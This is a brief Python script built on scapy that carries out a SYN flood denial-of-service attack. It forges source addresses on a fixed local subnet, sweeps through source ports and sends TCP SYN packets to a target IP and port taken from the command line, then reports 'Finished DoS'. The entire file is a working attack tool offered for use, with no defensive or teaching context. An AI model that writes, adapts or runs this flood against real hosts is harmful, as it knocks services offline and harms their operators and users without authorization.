import sys
from scapy.all import IP, TCP, send


def syn_flood(target_ip, target_port, src_net):
    #for src_host in range(1, 255):
    src_host = '15'
    for src_port in range(1024, 65535):

        # build packet
        src_ip = src_net + str(src_host)
        ip_packet = IP(src=src_ip, dst=target_ip)
        syn_packet = TCP(sport=src_port, dport=target_port, flags='S')

        send(ip_packet/syn_packet, verbose=0)

    print('[+] Finished DoS')


if __name__ == '__main__':
    if len(sys.argv) != 3:
        print('usage: python3 ' + sys.argv[0] + ' <target IP> <target port>')
        exit(0)

    src_net = '192.168.15.'

    target_ip = sys.argv[1]
    target_port = int(sys.argv[2])

    syn_flood(target_ip, target_port, src_net)

